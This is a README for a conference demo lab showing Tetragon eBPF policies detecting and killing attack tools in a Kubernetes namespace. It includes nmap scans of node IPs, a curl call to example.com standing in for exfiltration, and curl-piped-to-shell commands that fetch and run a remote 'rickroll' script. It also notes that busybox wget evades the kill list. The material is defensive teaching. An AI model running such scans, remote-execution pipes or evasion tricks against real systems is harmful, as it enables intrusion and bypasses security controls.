# Phase 2 — attack workload

`netshoot.yaml` creates everything the policies in [`../policies/`](../policies/)
are demonstrated against. Apply it with `make lab` (which installs Tetragon
first).

## What it creates

| Object | Name | Node | Why |
|---|---|---|---|
| Namespace | `tetragon-demo` | – | everything Phase 2 lives here; `11` is scoped to it |
| Pod | `attacker` | `k8s-worker-0-bsides-krk-demo` | runs the attacks |
| Pod | `victim` (nginx:1.27-alpine, port 80) | `k8s-master-0-bsides-krk-demo` | harmless in-cluster target |
| Service | `victim` → port 80 | – | gives the victim a ClusterIP (in the service CIDR, so `00` stays quiet) |

## Design choices worth remembering

- **Image `nicolaka/netshoot:latest`.** Ships the exact toolkit the policies
  target. Real binaries (checked 2026-09-15): `/usr/bin/nmap`, `/usr/bin/curl`,
  `/usr/bin/nc`, `/usr/bin/tcpdump`, `/usr/bin/dig`. `wget` is busybox
  (`/bin/busybox`), so it is **not** on any kill list. Use it when you need
  traffic that survives mitigation.
- **PID 1 is `sleep infinity`.** Attacks run through `kubectl exec`. Each
  successful kill takes out the exec'd process, never the container, so the pod
  (and your demo shell) survives every kill.
- **`NET_RAW` + `NET_ADMIN` capabilities.** Without them `nmap -sS` and
  `tcpdump` fail on permissions, and the audience would see the container
  runtime saying no instead of eBPF.
- **Attacker and victim on different nodes.** Every flow between them crosses
  a node boundary, so Hubble shows inter-node traffic. This requires the
  control plane to be untainted (`make untaint`). If `victim` is `Pending`,
  that step didn't run.
- **`:latest` tag.** Convenient, but the image can change between rehearsal
  and the talk. If you want certainty, pin a digest after rehearsal.

## The attacks

```bash
# detection (make detect) -- quiet vs loud
kubectl exec -n tetragon-demo attacker -- curl -sk https://kubernetes.default.svc.cluster.local/version  # quiet
kubectl exec -n tetragon-demo attacker -- nmap -sT -p 22,6443,10250 10.1.1.40-42                          # event
kubectl exec -n tetragon-demo attacker -- curl -s -o /dev/null -w '%{http_code}\n' https://example.com      # event

# mitigation (make mitigate) -- each exits 137
kubectl exec -n tetragon-demo attacker -- nmap -sT -p 22,6443 10.1.1.40-42
kubectl exec -n tetragon-demo attacker -- curl -s https://example.com
kubectl exec -n tetragon-demo attacker -- tcpdump -i any -c 5

# still allowed after mitigation (wget is busybox, not on the kill list)
kubectl exec -n tetragon-demo attacker -- wget -qO- http://victim
```

Stream events in a second terminal, filtered to this namespace:

```bash
kubectl exec -n kube-system ds/tetragon -c tetragon -- tetra getevents -o compact -n tetragon-demo
```

## Cleanup

```bash
kubectl delete -f netshoot.yaml
```

## The exfiltration gag (`attack.sh`)

The exfil step on the slide is a plain `curl … https://example.com`. `attack.sh`
is the fun stand-in: the "attack" fetches a payload from **outside** the cluster
(this file, served raw from GitHub), and the payload is a harmless troll —
theatrical fake exfiltration in the terminal, then it opens a rickroll in the
browser. Nothing in it reads a real secret or sends real data; every scary line
is an `echo`, and the only real action is opening a YouTube URL.

**Run it on the laptop (projected)** for the browser rickroll:

```bash
curl -s https://raw.githubusercontent.com/renatofenrir/bsides-krk-ebpf-lab/main/phase2-container-lab/attack/attack.sh | bash
```

Piped into the attacker pod it still prints the theatre on the projected
terminal, but there is no browser there, so it just prints the link:

```bash
kubectl exec -n tetragon-demo attacker -- sh -c \
  'curl -s https://raw.githubusercontent.com/renatofenrir/bsides-krk-ebpf-lab/main/phase2-container-lab/attack/attack.sh | sh'
```

Use the laptop form for the payoff. It doubles as a real "fetch to an external
host" for the exfil beat — Tetragon still sees the `curl` either way.

### The raw URL

The payload is just this file, served over `raw.githubusercontent.com`, so it is
its own source of truth — nothing separate to keep in sync. Keep the branch
segment (`main`) matching the default branch. Because it is served from the
repo, the file is public the moment the repo is — the attacker pod fetches it
with no token.
